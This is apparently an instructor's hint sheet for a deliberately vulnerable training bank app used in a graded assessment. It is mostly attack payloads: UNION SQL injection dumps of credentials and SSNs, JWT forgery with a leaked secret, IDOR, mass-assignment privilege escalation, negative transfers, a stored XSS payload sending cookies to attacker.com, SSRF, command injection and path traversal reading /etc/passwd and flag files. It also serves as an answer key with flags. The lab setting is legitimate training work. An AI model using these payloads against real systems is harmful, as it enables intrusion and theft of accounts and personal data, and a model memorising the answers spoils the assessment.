# Moneta Bank — Verified URL & Payload Cheat Sheet (Instructor Hints)

Valid paths and payload variations for the Moneta Bank final assessment.
All paths verified against the actual route table. Rebuild before session:
`docker compose up -d --build moneta-bank`

## 1. Recon & Misconfig

```
# Health / config (no auth)
GET  /health
GET  /api/config

# Debug — leaks JWT secret (the linchpin)
GET  /auth/debug
# -> {"jwt_secret":"moneta-super-secret-2024","database":{...}}

# Verbose stack traces on any 500
POST /auth/login  (send anything broken)
```

## 2. Auth — register / login / reset

```
# Register (auto-creates a checking account with 1000.00)
POST /auth/register
Body: {"username":"student1","email":"s1@x.com","password":"Passw0rd!"}
-> { token, customer, account:{account_number:"MB-xxxx-0001", balance:1000} }

# Login
POST /auth/login
Body: {"username":"admin","password":"Admin@123"}   # seeded admin
      {"username":"alice","password":"Alice@123"}   # seeded customer w/ account
      {"username":"bob","password":"Bob@123"}

# Reset — secret = md5(ssn) first 8 hex chars (predictable)
POST /auth/reset-password
Body: {"username":"alice","secret":"<md5 of alice's ssn 987-65-4321 -> first 8>"}
-> {"temporaryPassword":"Reset-XXXXX"}
```

## 3. IDOR — read anyone's statement (no auth needed)

```
GET /api/accounts/MB-1000-0001/statement   # admin's $10B savings
GET /api/accounts/MB-1000-0002/statement   # alice's checking
GET /api/accounts/MB-1000-0003/statement   # bob's checking
GET /api/accounts/<your-number>/statement  # your own
# Try: MB-1000-0001 through MB-1000-0005, and ../ traversal on accountNumber
```

## 4. SQLi (UNION-based) — needs a token

```
# Get a token: register or login
GET /api/transactions/search?q=test   (needs: Authorization: Bearer <token>)

# Column count probing
?q=' ORDER BY 1--
?q=' ORDER BY 2--
?q=' UNION SELECT NULL,NULL,NULL--

# Dump users (id, username, password-hash)
?q=' UNION SELECT id, username, password FROM customers--
?q=' UNION SELECT id, username, ssn FROM customers--      # flag in admin ssn
?q=' UNION SELECT id, username, email FROM customers--
?q=' UNION SELECT id, username, password FROM customers WHERE username='admin'--

# Admin search (same SQLi surface, no token needed)
GET /admin/api/customers?q=' OR 1=1--
GET /admin/api/customers?q=' UNION SELECT id,username,email,role,ssn FROM customers--
```

## 5. JWT Forgery (after leaking secret)

```
# 1. GET /auth/debug -> jwt_secret = moneta-super-secret-2024
# 2. Forge token (header alg=HS256, payload sub=1, username=admin, role=admin, vip=true)
# 3. Use it:
GET /admin/api/flag                (Authorization: Bearer <forged>)
GET /admin/panel                   (as cookie moneta_session=<forged>)
-> {"flag":"FLAG{ADMIN_PANEL_ACCESS_GRANTED}"}
```

## 6. Mass Assignment — privesc to admin

```
PUT /api/profile   (needs token)
Body: {"role":"admin"}
Body: {"is_vip":true}
-> { id, username, role:"admin", ... }  then re-login for admin JWT
```

## 7. Business Logic — negative transfer / CSRF

```
POST /api/transfer   (needs token/cookie; NO CSRF token anywhere)
Body: {"to":<your-account-id>,"amount":-1000,"memo":"neg"}   # credits your account!
Body: {"to":<dest-id>,"amount":1,"memo":"x"}
# to = account id (integer), not account number
# amount < 0 not blocked; amount > balance not checked
```

## 8. Stored XSS -> steal admin cookie

```
POST /support/api/tickets
Body: {"subject":"hello","message":"<script>fetch('//attacker.com/steal?c='+document.cookie)</script>"}
# Admin views /admin/panel -> message rendered with <%- %> (unescaped) -> fires
GET /support/api/tickets/:id       # read any ticket, no auth (IDOR)
```

## 9. SSRF

```
POST /api/verify-bank   (needs token)
Body: {"url":"http://moneta-db:5432"}              # internal Postgres (port open)
Body: {"url":"http://moneta-db:5432/x"}            # psql error text leaks
Body: {"url":"http://127.0.0.1:8080/health"}       # itself
Body: {"url":"http://host.docker.internal:5433"}   # host Postgres
```

## 10. Command Injection

```
# account value lands inside: sh -c "echo ... > /tmp/statement_<account>.csv; ..."
GET /api/export?account=1$(whoami)                  # if exists, file written as whoami
GET /api/export?account=1;cat+/flag.txt             # semicolon chaining
GET /api/export?account=`cat+/flag.txt`             # backticks
GET /api/export?account=1%26%26+id                  # && (URL-encoded)
# Blind: write marker then read via path traversal (below)
GET /api/export?account=1;echo+PWNED+>/tmp/pwned
```

## 11. Path Traversal — read files

```
GET /api/download?file=../../../../etc/passwd
GET /api/download?file=../../../../flag.txt
GET /api/download?file=../../app/package.json        # source layout
GET /api/download?file=../../app/src/db.js           # DB creds + JWT logic
```

## The Full Kill Chain (strongest student)

1. `GET /auth/debug` -> JWT secret
2. Forge admin token -> `GET /admin/api/flag` -> flag 1
3. SQLi -> dump admin hash (`Admin@123`) + `ssn` -> flag 2
4. Command injection or path traversal -> `/flag.txt` -> flag 3